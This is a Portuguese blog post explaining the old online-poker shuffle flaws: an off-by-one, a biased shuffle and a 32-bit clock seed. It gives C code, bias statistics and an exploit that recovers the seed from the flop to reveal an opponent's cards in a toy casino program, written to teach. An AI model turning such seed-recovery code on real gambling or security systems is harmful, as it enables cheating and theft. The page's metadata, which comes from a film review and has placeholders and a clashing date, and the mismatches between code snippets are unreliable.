<!DOCTYPE html>
<html lang="en-us" dir="ltr" itemscope itemtype="http://schema.org/Article">
  <head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Blogue do Caloni - 2 Coelhos</title>
  <meta name="author" content="" />
  <meta name="generator" content="Hugo 0.110.0">
  <meta property="og:title" content="2 Coelhos"/>
  <meta property="og:type"
        content="article"/>
  <meta property="og:url" content="http://www.caloni.com.br/todo-put-original-title-slug/"/>
  <meta property="og:image"
        content="/img/author.jpg"/>
  <meta property="og:description"
        content="Uma montagem impec·vel consegue dar o tom da narrativa do complexo 2 Coelhos. AlÈm de complexo, existem pequenos detalhes da trama que forÁam um pouco a realidade (como a uni„o entre o protagonista e..."/>
  <link href="" rel="feed" type="application/rss+xml"
        title="Blogue do Caloni"/>
  <link rel="stylesheet" type="text/css" href="/css/custom.css"/>
  <link rel="stylesheet" type="text/css" href="/css/jquery-ui.css"/>
  <link rel="stylesheet" type="text/css" href="/css/board-min.css"/>
  <script src="/js/jquery-1.10.2.js"></script>
  <script src="/js/jquery-ui.js"></script>
  <script src="/js/pgnyui.js"></script>
  <script src="/js/pgnviewer.js"></script>
  <script src="/js/list.js"></script>
  <link rel="icon" href="/img/favicon.ico"/>
</head>
<body style="min-height:100vh;display:flex;flex-direction:column">
  <nav class="navbar has-shadow is-white"
        role="navigation" aria-label="main navigation">
  <div class="container">
  <div class="navbar-brand">
  <pre><span style="font-size: 3px; margin: 0; display: block;">
&amp;*/. .*%@@@@@@@@@@@@&amp;/    , &amp;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@#,*@@@@%,*&amp;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@./@.(@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@**#./((,*, *./((*,#,&amp;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@.#@@%&amp;@@* (@@%&amp;@@/#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@,#@@&amp;&amp;@@, (@@&amp;&amp;@@*#@@@@@@@@@@@@@#/,,.         ..,/#&amp;@@@@@@@@@@@@@@@@@@@@@@@
@@@@@&amp;, .//      .//  .%@@@@@@&amp;#.  .,****.,*************,.  .(&amp;@@@@@@@@@@@@@@@@@
@@@*                     ,@/  .**,,,*********,   ,***,   ****    *@@@@@@@@@@@@@@
@#                         ,***      .******       ,***,*****,      *&amp;@@@@@@@@@@
&amp;                           ,**      .******.     .******************  (@@@@@@@@
                             ****..,*************************,    ,***   (@@@@@@
@@@@#,,,,,,,,,,,,,,,,,,,,*********,   ,**************,  .***,      .**. .  %@@@@
@@@@%                   .***,.,****,.,***,     ,****      ***.     ,******, /@@@
@@@@@&amp;.                ,**       *******,       *****,  .******************, *@@
@@@@@@@&amp;,            ,****      .********,.   .*************,  ,*****,    ,** /@
@@@@@@@@@@@@&amp;/ .****,    ************.   ****************************      **. #
@@@@@@@@@@@@@, *****,    ,***********    .******,   ,****.   .*****,***,,***** ,
@@@@@@@@@@@@&amp;..**************,  ,***********************       ,*,    ********..
@@@@@@@@@@@@&amp; ,**.    ,******.  .*******.    .**********,     .**********. .**, 
@@@@@@@@@@@@% ,*       ,***************.      .*****************************,   
@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@,(&amp;&amp;&amp;&amp;@,(&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;#*@&amp;&amp;&amp;@*#&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;
@@@@@@@@@@@@@@@@@@@@@@@@@@@@(.#@@@@(.#@@@@@@@@@@@@@@@@@@@@@#**@@@@(.#@@@@@@@@@@@
  </span></pre>
  &nbsp;
  <a class="navbar-item" title="Go to Home" href="/">
    <div class="is-6">Blogue do Caloni</div>
  </a>
  </div>
  </div>
  </nav>
  <div class="container">
  <p class="title">
  <a class="external" href="https://www.caloni.com.br/todo-put-external-link-here">
  Todo Put Post Title Here
  </a>
  </p>
  <div class="content">
<p>Em 2014 eu palestrei na trilha de seguran√ßa do TDC em S√£o Paulo um tema que me deixou muito animado: um exploit baseado em falhas de programa√ß√£o em um c√≥digo de 10 linhas. O c√≥digo era t√£o simples que achei v√°lido traduzir para C e demonstrar como atacar uma simula√ß√£o de cassino online.</p>
<p>Esta palestra (e o c√≥digo) se perdeu no tempo, mas eu anotei o nome da pesquisadora que escreveu o post pelo qual me baseei: Laura Diane Hamilton (que tamb√©m estuda Machine Learning em seu blog). [Seu post] comenta sobre uma hist√≥ria de 1990 quando hackers se aproveitaram de falhas b√°sicas no algoritmo de embaralhamento de cartas de p√¥quer.</p>
<p>O c√≥digo original estava escrito em Pascal, mas √© facilmente traduzido para C:</p>
<p>    unsigned char Card[52];</p>
<p>    unsigned char CurrentCard = 0;</p>
<p>    unsigned char JustShuffled = 0;</p>
<p>    </p>
<p>    void DeckShuffle()</p>
<p>    {</p>
<p>      unsigned char ctr;</p>
<p>      unsigned char tmp;</p>
<p>      unsigned char random_number;</p>
<p>    </p>
<p>      /* Fill the deck with unique cards */</p>
<p>      for( ctr = 0; ctr < 52; ctr++ )</p>
<p>        Card[ctr] = ctr + 1;</p>
<p>      /* Generate a new seed based on the system clock */</p>
<p>      srand(time(NULL));</p>
<p>      /* Randomly rearrange each card */</p>
<p>      for( ctr = 0; ctr < 52; ctr++ )</p>
<p>      {</p>
<p>        random_number = rand() % 51;</p>
<p>        tmp = card[random_number];</p>
<p>        card[random_number] = card[ctr];</p>
<p>        card[ctr] = tmp;</p>
<p>      }</p>
<p>      CurrentCard = 0;</p>
<p>      JustShuffled = 1;</p>
<p>    }</p>
<p>Fiz um c√≥digo para compilar e rodar o embaralhador de cartas que [embaralha e imprime] a sa√≠da em cada nova execu√ß√£o para podermos observar mais facilmente os bugs encontrados por Hamilton. A falha n√∫mero 1, o "An Off-by-One Error", pode ser feita em C tamb√©m, se voc√™ usar a fun√ß√£o rand() da maneira como est√° no c√≥digo:</p>
<p>    random_number = rand() % 51;</p>
<p>√â um erro simples de ser cometido por programadores incautos, que querem expressar na verdade a obten√ß√£o de um n√∫mero aleat√≥rio entre 1 e 52 e ao mesmo tempo obter o √≠ndice correto 0-based de um array. No entanto, o resto de uma divis√£o por N sempre ir√° cair entre 0 e N-1, j√° obtendo o √≠ndice correto em C.</p>
<p>    random_number = rand() % 52;</p>
<p>Para observar o que Hamilton quer dizer com "a 52a. carta nunca ir√° cair na 52a. posi√ß√£o" √© poss√≠vel for√ßar um loop nesse estilo:</p>
<p>    /* call only once in main */</p>
<p>    srand(time(NULL));</p>
<p>    do</p>
<p>    {</p>
<p>      DeckShuffle();</p>
<p>    }</p>
<p>    while( Card[51] != 52 );</p>
<p>Este loop nunca ir√° terminar. Fa√ßa o teste. Depois compare com a rapidez com que o loop encontra a carta 52 em qualquer outra posi√ß√£o.</p>
<p>A segunda falha, "The Shuffle Isn't Uniform", diz respeito √† distribui√ß√£o n√£o-uniforme da igual probabilidade de certas cartas estarem em qualquer posi√ß√£o da pilha. Da maneira com que √© implementado o algoritmo essa distribui√ß√£o √© enviesada. Temos como provar isso atribuindo pesos a cada embaralhada e depois de um certo tempo exibir os totais:</p>
<p>    int CardStats[52];</p>
<p>    int j, j2;</p>
<p>    for( j = 0; j < 1000; ++j )</p>
<p>    {</p>
<p>      for( j2 = 0; j2 < 1000; ++j2 )</p>
<p>      {</p>
<p>        DeckShuffle();</p>
<p>        for( i = 0; i < 52; ++i )</p>
<p>          if( Card[i] == i+1 )</p>
<p>            CardStats[i]++;</p>
<p>      }</p>
<p>    }</p>
<p>    printf("cards stats: \n");</p>
<p>    for( i = 0; i < 52; ++i )</p>
<p>    {</p>
<p>      printf("%d ", CardStats[i]);</p>
<p>    }</p>
<p>A vers√£o original do algoritmo rodando um milh√£o de vezes demonstra o vi√©s de forma descarada:</p>
<p>    cards stats:</p>
<p>    19270 18869 18685 18442 </p>
<p>    18348 18024 18119 17647 </p>
<p>    17612 17388 17661 17360 </p>
<p>    17183 17018 17176 16621 </p>
<p>    16705 16522 16337 16599 </p>
<p>    16499 16238 16315 15970 </p>
<p>    16294 16388 16294 16418 </p>
<p>    16463 16313 16462 16491 </p>
<p>    16450 16384 16674 16736 </p>
<p>    16577 16879 16933 17159 </p>
<p>    17417 17344 17672 18025 </p>
<p>    17883 18053 18107 18691 </p>
<p>    19042 19152 19559 0</p>
<p>Com a corre√ß√£o desse vi√©s (e do bug da 52a. carta) aplicada:</p>
<p>    random_number = rand() % (ctr - 52) + ctr;</p>
<p>O resultado se torna muito mais uniforme:</p>
<p>    cards stats:</p>
<p>    19116 19035 19371 19328 </p>
<p>    19293 19327 19308 19277 </p>
<p>    19412 19231 19314 19192 </p>
<p>    19200 19229 19461 19398 </p>
<p>    19299 19314 19452 19291 </p>
<p>    19329 19003 19354 19282 </p>
<p>    19319 19237 19255 19149 </p>
<p>    19321 19291 19123 19266 </p>
<p>    19237 19443 19355 19318 </p>
<p>    19321 19127 19147 19277 </p>
<p>    19250 19307 19353 19169 </p>
<p>    19047 19225 19310 19297 </p>
<p>    19298 19423 19370 19213</p>
<p>No entanto, o pior bug talvez seja a uni√£o entre a terceira e a quarta falhas apontadas pela pesquisadora: "Using a 32-bit Seed" + "Using the System Clock as a Seed". Com esses dois unidos o hackerismo fica √† solta, pois al√©m das possibilidades de embaralhamento ficarem restritas em 2^32 o uso do clock limita em 86,400,000 milissegundos por dia da fun√ß√£o random do Pascal. Em C poderia ser feito algo semelhante.</p>
<p>Um range muito espec√≠fico de gera√ß√£o da semente do gerador de n√∫meros aleat√≥rios pode criar uma tabela male√°vel de possibilidades. Com isso em m√£os, de acordo com Hamilton, uma vez que o atacante saiba pelo menos cinco cartas √© poss√≠vel fazer uma busca r√°pida em um range pequeno possibilidades. Em um jogo de p√¥quer isso √© poss√≠vel apenas com duas cartas em sua m√£o e as tr√™s cartas na mesa (flop).</p>
<p>Com base nesse comportamento vamos criar um [exploit] que recebe as tr√™s cartas do flop fornecidas pelo atacante que est√° no jogo e que inicia uma busca a partir do hor√°rio atual para tr√°s. Conforme o programa encontra matches dessas tr√™s cartas juntas ele exibe o deck completo de cartas, a partir do qual o atacante pode verificar se suas cartas constam na distribui√ß√£o.</p>
<p>    time(&curr_time);</p>
<p>    printf("how is the flop? ");</p>
<p>    scanf("%d %d %d", &flop1, &flop2, &flop3);</p>
<p>    while( 1 )</p>
<p>    {</p>
<p>      DeckShuffle(curr_time);</p>
<p>      if( Card[0] == flop1 && Card[1] == flop2 && Card[2] == flop3 )</p>
<p>      {</p>
<p>        printf("%d: ", (int) curr_time);</p>
<p>        for( i = 0; i < 52; ++i )</p>
<p>        {</p>
<p>          printf("%d ", Card[i]);</p>
<p>        }</p>
<p>        printf("\n");</p>
<p>      }</p>
<p>      curr_time--;</p>
<p>    }</p>
<p>Por sua vez o [cassino] rodar√° o algoritmo bugado que j√° vimos. Para simplificar ele j√° pergunta para o jogador #2 se ele sabe quais s√£o as cartas do jogador #1. Se ele n√£o souber o programa diz ser ainda seguro, mas se acertar isso √© revelado.</p>
<p>    DeckShuffle();</p>
<p>  </p>
<p>    printf("(for you) your cards, player#%d: %d %d\n", </p>
<p>      player, Card[3 + (player-1) * 2], Card[3 + (player-1) * 2 + 1]);</p>
<p>    printf("(for all) flop: %d %d %d\n", Card[0], Card[1], Card[2]);</p>
<p>    player1_card1 = Card[3];</p>
<p>    player1_card2 = Card[4];</p>
<p>  </p>
<p>    printf("do you know which cards have player #1? ");</p>
<p>    scanf("%d %d", &player1_guess1, &player1_guess2);</p>
<p>    if( player1_guess1 == player1_card1 </p>
<p>      && player1_guess2 == player1_card2 )</p>
<p>    {</p>
<p>      printf("acerto, miseravi!\n");</p>
<p>    }</p>
<p>    else</p>
<p>    {</p>
<p>      printf("no no no, I am still secure!\n");</p>
<p>    }</p>
<p>Para rodar os programas basta iniciar o cassino e copiar as cartas do flop. Em seguida rodar o exploit e colar o flop. A partir da√≠ ele come√ßa a calcular e quando houver um deck em que aparecem as suas cartas copiar e colar as cartas do advers√°rio, ou seja, o jogador #1, que s√£o as cartas logo depois do flop.</p>
<p>    >cassino.exe</p>
<p>    (for you) your cards, player#2: 1 21</p>
<p>    (for all) flop: 9 22 15</p>
<p>    do you know which cards have player #1?</p>
<p>    </p>
<p>    >cassino_exploit.exe</p>
<p>    how is the flop? 9 22 15</p>
<p>    1614385852: 9 22 15 6 12 1 21 14 ...</p>
<p>    1614222117: 9 22 15 4 36 16 25 5 ...</p>
<p>    1613983918: 9 22 15 32 31 14 16 ...</p>
<p>    ^C</p>
<p>    </p>
<p>    (for you) your cards, player#2: 1 21</p>
<p>    (for all) flop: 9 22 15</p>
<p>    do you know which cards have player #1? 6 12</p>
<p>    acerto, miseravi!</p>
<p>[Seu post]: http://www.lauradhamilton.com/random-lessons-online-poker-exploit</p>
<p>[embaralha e imprime]: shuffle_cards.c</p>
<p>[exploit]: cassino_exploit.c</p>
<p>[cassino]: cassino.c</p>

</div>
  <div class="taglist">
  <p class="author">Wanderley Caloni,
     <a href="https://github.com/Caloni/blog/blob/master/content/posts/todo-dunno-original-post-source">
     2012-02-15 00:00:00 &#43;0000
     </a>
  </p>
  <a href="/categories/writting">writting</a> 
  <a href="/tags/movies">movies</a> 
  <a class="externalgray" href="https://t.me/paneloni">discuss</a>
  <script type="text/javascript" src="//cdn.livetrafficfeed.com/static/hitcounterjs/live.js?sty=49&min=1&sta=0&uni=1&tz=America%2FSao_Paulo&ro=0"></script><noscript id="LTF_hitcounter"><a href="https://livetrafficfeed.com/hit-counter">Hit Counter</a></noscript>
  </div>
  </div>
  </body>
  </html>
